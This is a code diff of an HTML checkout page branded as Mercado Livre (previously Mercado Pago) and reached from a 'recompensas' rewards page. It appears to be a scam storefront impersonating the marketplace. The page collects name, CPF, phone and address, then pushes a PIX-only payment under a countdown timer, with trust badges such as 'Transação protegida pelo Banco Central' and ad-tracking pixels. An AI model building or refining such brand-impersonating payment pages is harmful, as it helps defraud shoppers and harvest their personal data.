@@ -3,9 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-  <title>Checkout Seguro - Mercado Pago</title>
-  <link rel="icon" href="../images/logocheckout.png">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <title>Checkout - Mercado Livre</title>
+  <link rel="icon" href="../recompensas/images/favicon.png">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="css/checkout.css">
 
   <!-- Meta Pixel Code -->
@@ -21,7 +21,6 @@
   <noscript><img height="1" width="1" style="display:none"
   src="https://www.facebook.com/tr?id=895868873361776&ev=PageView&noscript=1"
   /></noscript>
-  <!-- End Meta Pixel Code -->
 
   <!-- UTMify Pixel -->
   <script>
@@ -33,7 +32,7 @@
   </script>
   <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
 
-  <!-- TikTok Pixel Code Start -->
+  <!-- TikTok Pixel Code -->
   <script>
   !function (w, d, t) {
     w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
@@ -43,469 +42,361 @@
     ttq.page();
   }(window, document, 'ttq');
   </script>
-  <!-- TikTok Pixel Code End -->
 </head>
 <body>
 
-  <!-- ======== HEADER ======== -->
-  <header class="checkout-header">
-    <div class="header-inner">
-      <img src="../images/logocheckout.png" alt="Mercado Pago" class="logo">
-      <div class="security-badge">
-        <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
-        <span>PAGAMENTO<br><b>100% SEGURO</b></span>
+  <!-- ======== ML HEADER ======== -->
+  <header class="ml-header">
+    <div class="ml-header-inner">
+      <a href="../recompensas/index.html" class="ml-logo-link">
+        <img src="../recompensas/images/logo.webp" alt="Mercado Livre" class="ml-logo">
+      </a>
+      <div class="ml-secure">
+        <svg width="16" height="16" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" fill="#333"/></svg>
+        <span>Compra segura</span>
       </div>
     </div>
   </header>
 
-  <!-- ======== URGENCY BAR ======== -->
-  <div class="urgency-bar">
-    <span class="urgency-icon">&#x23F3;</span>
-    Seu cupom de desconto do <strong>Mercado Livre</strong> expira em breve! Pague com PIX para garantir.
+  <!-- ======== STEPPER ======== -->
+  <div class="ml-stepper">
+    <div class="ml-stepper-inner">
+      <div class="ml-step active" data-step="1">
+        <div class="ml-step-dot"><span>1</span></div>
+        <div class="ml-step-label">Dados</div>
+      </div>
+      <div class="ml-step-line"></div>
+      <div class="ml-step" data-step="2">
+        <div class="ml-step-dot"><span>2</span></div>
+        <div class="ml-step-label">Entrega</div>
+      </div>
+      <div class="ml-step-line"></div>
+      <div class="ml-step" data-step="3">
+        <div class="ml-step-dot"><span>3</span></div>
+        <div class="ml-step-label">Pagamento</div>
+      </div>
+    </div>
   </div>
 
-  <!-- ======== FULL BANNER ======== -->
-  <div class="full-banner">
-    <img src="../images/headercheckout.jpg" alt="FULL - Envio mais rápido do Brasil">
-  </div>
+  <!-- ======== MAIN CONTENT ======== -->
+  <main class="ml-main">
 
-  <div class="checkout-main">
-
-    <!-- ======== CART SUMMARY ======== -->
-    <section class="cart-summary">
-      <div class="cart-header" onclick="toggleCart()">
-        <div class="cart-header-left">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="#009ee3"><path d="M7 18c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm10 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zM7.17 14.75l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49A.996.996 0 0020.01 4H5.21l-.94-2H1v2h2l3.6 7.59-1.35 2.44C4.52 15.37 5.48 17 7 17h12v-2H7.42c-.14 0-.25-.11-.25-.25z"/></svg>
-          <h3>Seu carrinho</h3>
-        </div>
-        <div class="cart-header-right">
-          <span class="cart-count" id="cart-count">0</span>
-          <svg class="cart-chevron" width="20" height="20" viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg>
-        </div>
+    <!-- ──── COMPACT CART BAR (visible on steps 1 & 2) ──── -->
+    <div class="cart-bar" id="cart-bar" onclick="toggleCartExpand()">
+      <div class="cart-bar-left">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="#3483fa"><path d="M7 18c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm10 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zM7.17 14.75l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49A.996.996 0 0020.01 4H5.21l-.94-2H1v2h2l3.6 7.59-1.35 2.44C4.52 15.37 5.48 17 7 17h12v-2H7.42c-.14 0-.25-.11-.25-.25z"/></svg>
+        <span>Seu carrinho</span>
+        <span class="cart-bar-count" id="cart-bar-count">0</span>
       </div>
-      <div class="cart-items" id="cart-items"></div>
-      <div class="cart-totals">
-        <div class="cart-row"><span>Subtotal</span><span id="subtotal">R$ 0,00</span></div>
-        <div class="cart-row"><span>Frete</span><span id="frete-display">-</span></div>
-        <div class="cart-row savings" id="savings-row" style="display:none;">
-          <span>Sua economia</span>
-          <span id="savings-amount">-R$ 0,00</span>
-        </div>
-        <div class="cart-row total"><span>Total</span><span id="total">R$ 0,00</span></div>
-      </div>
-      <button class="add-more-btn" onclick="goToRecompensas()">
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="#009ee3"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
-        Adicionar mais produtos
-      </button>
-    </section>
-
-    <!-- ======== WARRANTY + TRUST BADGES ======== -->
-    <div class="trust-strip">
-      <div class="trust-item">
-        <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
-        <div>
-          <strong>1 Ano de Garantia</strong>
-          <span>em todos os produtos</span>
-        </div>
-      </div>
-      <div class="trust-item">
-        <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
-        <div>
-          <strong>Pagamento Seguro</strong>
-          <span>criptografia SSL</span>
-        </div>
-      </div>
-      <div class="trust-item">
-        <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
-        <div>
-          <strong>Devolução Grátis</strong>
-          <span>7 dias sem burocracia</span>
-        </div>
+      <div class="cart-bar-right">
+        <span class="cart-bar-total" id="cart-bar-total">R$ 0,00</span>
+        <svg class="cart-bar-chevron" id="cart-bar-chevron" width="16" height="16" viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z" fill="#666"/></svg>
       </div>
     </div>
 
-    <!-- ======== STEPS INDICATOR ======== -->
-    <div class="steps-indicator">
-      <div class="step active" data-step="1">
-        <div class="step-number">1</div>
-        <span>Identificação</span>
-      </div>
-      <div class="step" data-step="2">
-        <div class="step-number">2</div>
-        <span>Entrega</span>
-      </div>
-      <div class="step" data-step="3">
-        <div class="step-number">3</div>
-        <span>Pagamento</span>
+    <!-- Expanded cart items (hidden by default) -->
+    <div class="cart-expand" id="cart-expand">
+      <div class="cart-expand-items" id="cart-expand-items"></div>
+      <div class="cart-expand-footer">
+        <a href="#" onclick="goToRecompensas(); return false;" class="cart-add-more">+ Adicionar mais produtos</a>
       </div>
     </div>
 
-    <!-- ======== STEP 1: IDENTIFICAÇÃO ======== -->
-    <section class="step-content" id="step-1">
-      <div class="form-card">
-        <div class="form-card-header">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="#009ee3"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
-          <span>Seus dados para entrega e nota fiscal</span>
+    <!-- ════════════════════════════════════════ -->
+    <!--  STEP 1: DADOS PESSOAIS                 -->
+    <!-- ════════════════════════════════════════ -->
+    <section class="step-panel active" id="step-1">
+      <div class="panel-card">
+        <div class="panel-card-title">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="#3483fa"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+          <h2>Dados pessoais</h2>
         </div>
-        <div class="form-group">
+        <p class="panel-card-desc">Informe seus dados para entrega e nota fiscal</p>
+
+        <div class="field">
           <label for="email">E-mail</label>
-          <input type="email" id="email" placeholder="seu@email.com" autocomplete="email">
-          <div class="error-msg"></div>
+          <input type="email" id="email" placeholder="seuemail@exemplo.com" autocomplete="email">
+          <div class="field-error"></div>
         </div>
-        <div class="form-group">
+        <div class="field">
           <label for="nome">Nome completo</label>
-          <input type="text" id="nome" placeholder="Nome Sobrenome" autocomplete="name">
-          <div class="error-msg"></div>
+          <input type="text" id="nome" placeholder="Como aparece no documento" autocomplete="name">
+          <div class="field-error"></div>
         </div>
-        <div class="form-group">
-          <label for="cpf">CPF</label>
-          <input type="text" id="cpf" placeholder="000.000.000-00" inputmode="numeric" maxlength="14">
-          <div class="error-msg"></div>
-        </div>
-        <div class="form-group">
-          <label for="telefone">Telefone</label>
-          <input type="tel" id="telefone" placeholder="(00) 00000-0000" inputmode="tel" maxlength="15">
-          <div class="error-msg"></div>
+        <div class="field-row">
+          <div class="field">
+            <label for="cpf">CPF</label>
+            <input type="text" id="cpf" placeholder="000.000.000-00" inputmode="numeric" maxlength="14">
+            <div class="field-error"></div>
+          </div>
+          <div class="field">
+            <label for="telefone">Celular</label>
+            <input type="tel" id="telefone" placeholder="(00) 00000-0000" inputmode="tel" maxlength="15">
+            <div class="field-error"></div>
+          </div>
         </div>
       </div>
 
-      <div class="data-notice">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="#999"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
-        Seus dados estão protegidos e serão usados apenas para envio e nota fiscal.
+      <div class="data-privacy">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="#999"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+        Seus dados estão protegidos com criptografia SSL
       </div>
 
-      <button class="cta-btn" onclick="goToStep(2)">
-        <span>CONTINUAR PARA ENTREGA</span>
-        <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
-      </button>
+      <button class="ml-btn-primary" onclick="goToStep(2)">Continuar</button>
     </section>
 
-    <!-- ======== STEP 2: ENTREGA ======== -->
-    <section class="step-content" id="step-2" style="display:none;">
+    <!-- ════════════════════════════════════════ -->
+    <!--  STEP 2: ENTREGA                        -->
+    <!-- ════════════════════════════════════════ -->
+    <section class="step-panel" id="step-2">
       <a href="#" onclick="goBack(); return false;" class="back-link">
-        <svg width="16" height="16" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
-        Voltar
+        <svg width="14" height="14" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z" fill="#3483fa"/></svg>
+        Voltar para dados pessoais
       </a>
 
-      <div class="form-card">
-        <div class="form-card-header">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="#009ee3"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8l8 5 8-5v10zm-8-7L4 6h16l-8 5z"/></svg>
-          <span>Endereço de entrega</span>
+      <div class="panel-card">
+        <div class="panel-card-title">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="#3483fa"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+          <h2>Endereço de entrega</h2>
         </div>
-        <div class="form-group">
+
+        <div class="field">
           <label for="cep">CEP</label>
           <div class="cep-row">
             <input type="text" id="cep" placeholder="00000-000" inputmode="numeric" maxlength="9">
             <button class="cep-btn" onclick="buscarCEP()">Buscar</button>
           </div>
-          <div class="error-msg"></div>
+          <div class="field-error"></div>
         </div>
-        <div class="form-group">
-          <label for="rua">Rua</label>
-          <input type="text" id="rua" readonly placeholder="Preencha o CEP">
-          <div class="error-msg"></div>
+        <div class="field">
+          <label for="rua">Rua / Avenida</label>
+          <input type="text" id="rua" readonly placeholder="Preencha o CEP acima">
+          <div class="field-error"></div>
         </div>
-        <div class="form-row">
-          <div class="form-group">
+        <div class="field-row">
+          <div class="field field-sm">
             <label for="numero">Número</label>
             <input type="text" id="numero" placeholder="Nº" inputmode="numeric">
-            <div class="error-msg"></div>
+            <div class="field-error"></div>
           </div>
-          <div class="form-group">
-            <label for="complemento">Complemento</label>
+          <div class="field field-lg">
+            <label for="complemento">Complemento <span class="optional">(opcional)</span></label>
             <input type="text" id="complemento" placeholder="Apto, bloco...">
           </div>
         </div>
-        <div class="form-group">
+        <div class="field">
           <label for="bairro">Bairro</label>
           <input type="text" id="bairro" readonly placeholder="—">
         </div>
-        <div class="form-row">
-          <div class="form-group">
+        <div class="field-row">
+          <div class="field field-lg">
             <label for="cidade">Cidade</label>
             <input type="text" id="cidade" readonly placeholder="—">
           </div>
-          <div class="form-group small">
+          <div class="field field-sm">
             <label for="uf">UF</label>
-            <input type="text" id="uf" readonly placeholder="—">
+            <input type="text" id="uf" readonly placeholder="—" maxlength="2">
           </div>
         </div>
       </div>
 
       <!-- SHIPPING OPTIONS -->
-      <div class="shipping-card" id="shipping-card" style="display:none;">
-        <h3>
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="#009ee3"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zm-1.5 9c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
-          Selecione o frete
-        </h3>
-        <label class="shipping-option selected" onclick="selectFrete('0')">
+      <div class="panel-card" id="shipping-card" style="display:none;">
+        <div class="panel-card-title">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="#3483fa"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zm-1.5 9c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
+          <h2>Opções de envio</h2>
+        </div>
+
+        <label class="ship-opt selected" onclick="selectFrete('0')">
           <input type="radio" name="frete" value="0" checked>
-          <div class="shipping-info">
-            <span class="shipping-name">Frete Grátis</span>
-            <span class="shipping-time">21 dias úteis</span>
+          <div class="ship-opt-body">
+            <div class="ship-opt-info">
+              <span class="ship-opt-name">Frete Grátis</span>
+              <span class="ship-opt-time">Chega em até 21 dias úteis</span>
+            </div>
+            <span class="ship-opt-price free">Grátis</span>
           </div>
-          <span class="shipping-price free">GRÁTIS</span>
         </label>
-        <label class="shipping-option" onclick="selectFrete('3266')">
+        <label class="ship-opt" onclick="selectFrete('3266')">
           <input type="radio" name="frete" value="3266">
-          <div class="shipping-info">
-            <span class="shipping-name">Mercado Envio</span>
-            <span class="shipping-time">3 dias úteis</span>
+          <div class="ship-opt-body">
+            <div class="ship-opt-info">
+              <span class="ship-opt-name">Mercado Envios</span>
+              <span class="ship-opt-time">Chega em até 3 dias úteis</span>
+            </div>
+            <span class="ship-opt-price">R$ 32,66</span>
           </div>
-          <span class="shipping-price">R$ 32,66</span>
         </label>
-        <label class="shipping-option" onclick="selectFrete('5922')">
+        <label class="ship-opt" onclick="selectFrete('5922')">
           <input type="radio" name="frete" value="5922">
-          <div class="shipping-info">
-            <span class="shipping-name">Azul Cargo Express</span>
-            <span class="shipping-time">12 - 24 horas</span>
+          <div class="ship-opt-body">
+            <div class="ship-opt-info">
+              <span class="ship-opt-name">Envio Full</span>
+              <span class="ship-opt-time">Chega em 12 a 24 horas</span>
+            </div>
+            <span class="ship-opt-price">R$ 59,22</span>
           </div>
-          <span class="shipping-price">R$ 59,22</span>
         </label>
       </div>
 
-      <button class="cta-btn" onclick="goToStep(3)">
-        <span>CONTINUAR PARA PAGAMENTO</span>
-        <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
-      </button>
+      <button class="ml-btn-primary" onclick="goToStep(3)">Continuar</button>
     </section>
 
-    <!-- ======== STEP 3: PAGAMENTO ======== -->
-    <section class="step-content" id="step-3" style="display:none;">
+    <!-- ════════════════════════════════════════ -->
+    <!--  STEP 3: PAGAMENTO PIX                  -->
+    <!-- ════════════════════════════════════════ -->
+    <section class="step-panel" id="step-3">
       <a href="#" onclick="goBack(); return false;" class="back-link">
-        <svg width="16" height="16" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
-        Voltar
+        <svg width="14" height="14" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z" fill="#3483fa"/></svg>
+        Voltar para entrega
       </a>
 
-      <!-- Almost there banner -->
-      <div class="almost-there">
-        <div class="almost-there-icon">&#127881;</div>
-        <div class="almost-there-text">
-          <strong>Quase lá! Falta só o pagamento</strong>
-          <span>Pague via PIX e receba o código de rastreio no e-mail</span>
+      <!-- Order Summary -->
+      <div class="panel-card order-summary">
+        <div class="panel-card-title">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="#3483fa"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
+          <h2>Resumo do pedido</h2>
         </div>
-      </div>
-
-      <!-- Order summary mini -->
-      <div class="order-summary-mini" id="order-summary-mini">
-        <div class="osm-header">
-          <span>Resumo do pedido</span>
-          <span class="osm-count" id="osm-count">0 item</span>
-        </div>
-        <div class="osm-items" id="osm-items"></div>
-        <div class="osm-totals">
-          <div class="osm-row"><span>Subtotal</span><span id="osm-subtotal">R$ 0,00</span></div>
-          <div class="osm-row"><span>Frete</span><span id="osm-frete">-</span></div>
-          <div class="osm-row osm-savings" id="osm-savings-row" style="display:none;">
+        <div class="os-items" id="os-items"></div>
+        <div class="os-totals">
+          <div class="os-row"><span>Subtotal</span><span id="os-subtotal">R$ 0,00</span></div>
+          <div class="os-row"><span>Frete</span><span id="os-frete">Grátis</span></div>
+          <div class="os-row os-savings" id="os-savings-row" style="display:none;">
             <span>Sua economia</span>
-            <span id="osm-savings">-R$ 0,00</span>
+            <span id="os-savings">-R$ 0,00</span>
           </div>
-          <div class="osm-row osm-total"><span>Total via PIX</span><span id="osm-total">R$ 0,00</span></div>
+          <div class="os-row os-total"><span>Total</span><span id="os-total">R$ 0,00</span></div>
         </div>
       </div>
 
-      <div class="payment-card">
-        <div class="pix-header">
-          <div class="pix-badge">
-            <img
-              src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Pix_%28Brazil%29_logo.svg/3840px-Pix_%28Brazil%29_logo.svg.png"
-              width="70"
-              height="28"
-              alt="Logo Pix"
-            />
+      <!-- PIX Payment -->
+      <div class="panel-card pix-card">
+        <div class="pix-method-header">
+          <div class="pix-method-radio">
+            <div class="pix-radio-dot"></div>
           </div>
-          <h3>Pague com PIX</h3>
-          <p>Escaneie o QR Code ou copie o código abaixo</p>
+          <div class="pix-method-info">
+            <span class="pix-method-name">Pix</span>
+            <span class="pix-method-desc">Aprovação imediata</span>
+          </div>
+          <img
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Pix_%28Brazil%29_logo.svg/3840px-Pix_%28Brazil%29_logo.svg.png"
+            alt="PIX" class="pix-logo-small">
         </div>
 
-        <!-- Loading state -->
+        <!-- Loading -->
         <div id="pix-loading" class="pix-loading">
-          <div class="spinner"></div>
-          <p>Gerando QR Code do PIX...</p>
+          <div class="ml-spinner"></div>
+          <p>Gerando código PIX...</p>
         </div>
 
         <!-- QR Code content -->
         <div id="pix-content" style="display:none;">
-          <div id="qr-code" class="qr-container"></div>
 
           <div class="pix-timer" id="pix-timer-box">
             <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
-            PIX expira em <span id="pix-countdown">10:00</span>
+            <span>Pague em até <b id="pix-countdown">10:00</b></span>
           </div>
 
-          <!-- PIX Tutorial Steps -->
-          <div class="pix-tutorial">
-            <div class="pix-tutorial-title">Como pagar:</div>
-            <div class="pix-tutorial-steps">
-              <div class="pix-step">
-                <div class="pix-step-num">1</div>
-                <div class="pix-step-text">Clique em <b>"Copiar código"</b> abaixo</div>
-              </div>
-              <div class="pix-step">
-                <div class="pix-step-num">2</div>
-                <div class="pix-step-text">Abra o <b>app do seu banco</b> e vá em PIX</div>
-              </div>
-              <div class="pix-step">
-                <div class="pix-step-num">3</div>
-                <div class="pix-step-text">Escolha <b>"Pix Copia e Cola"</b> e cole o código</div>
-              </div>
+          <div class="pix-qr-area">
+            <div id="qr-code" class="pix-qr"></div>
+          </div>
+
+          <!-- How to pay -->
+          <div class="pix-steps">
+            <div class="pix-step-item">
+              <div class="pix-step-n">1</div>
+              <span>Copie o código abaixo</span>
+            </div>
+            <div class="pix-step-item">
+              <div class="pix-step-n">2</div>
+              <span>Abra o app do banco e vá em <b>Pix</b></span>
+            </div>
+            <div class="pix-step-item">
+              <div class="pix-step-n">3</div>
+              <span>Escolha <b>Pix Copia e Cola</b> e cole o código</span>
             </div>
           </div>
 
-          <!-- Copy code - GIANT button -->
-          <div class="copy-section">
-            <div class="copy-code">
+          <!-- Copy section -->
+          <div class="pix-copy">
+            <div class="pix-copy-field">
               <input type="text" id="pix-code" readonly value="">
             </div>
-            <button class="copy-btn-giant" onclick="copyPixCode()" id="copy-btn">
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
-              <span>COPIAR CÓDIGO PIX</span>
+            <button class="ml-btn-copy" onclick="copyPixCode()" id="copy-btn">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+              Copiar código Pix
             </button>
           </div>
 
           <!-- Polling status -->
-          <div class="payment-status" id="payment-status">
-            <div class="status-dot"></div>
+          <div class="pix-status" id="payment-status">
+            <div class="pix-status-dot"></div>
             <span>Aguardando pagamento...</span>
           </div>
 
-          <button class="check-payment-btn" onclick="checkPayment()">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-            Já paguei - Verificar pagamento
+          <button class="ml-btn-secondary" onclick="checkPayment()">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="#3483fa"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+            Já paguei
           </button>
 
-          <p class="pix-auto-confirm">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="#00a650"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-            O pagamento é confirmado <b>automaticamente</b> em até 30 segundos
+          <p class="pix-auto-msg">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="#00a650"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+            Confirmação automática em até 30 segundos
           </p>
         </div>
 
         <!-- Payment confirmed -->
-        <div id="pix-confirmed" class="payment-confirmed" style="display:none;">
-          <div class="confirmed-animation">
-            <svg width="64" height="64" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+        <div id="pix-confirmed" class="pix-confirmed" style="display:none;">
+          <div class="confirmed-check">
+            <svg width="56" height="56" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="#00a650"/></svg>
           </div>
-          <h3>Pagamento Confirmado!</h3>
-          <p>Redirecionando para emissão da nota fiscal...</p>
+          <h3>Pagamento aprovado!</h3>
+          <p>Redirecionando...</p>
         </div>
       </div>
 
-      <!-- Security Reinforcement on payment step -->
-      <div class="payment-trust">
-        <div class="pt-item">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="#00a650"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
-          <span>Transação protegida pelo Banco Central</span>
+      <!-- Trust -->
+      <div class="trust-bar">
+        <div class="trust-item-sm">
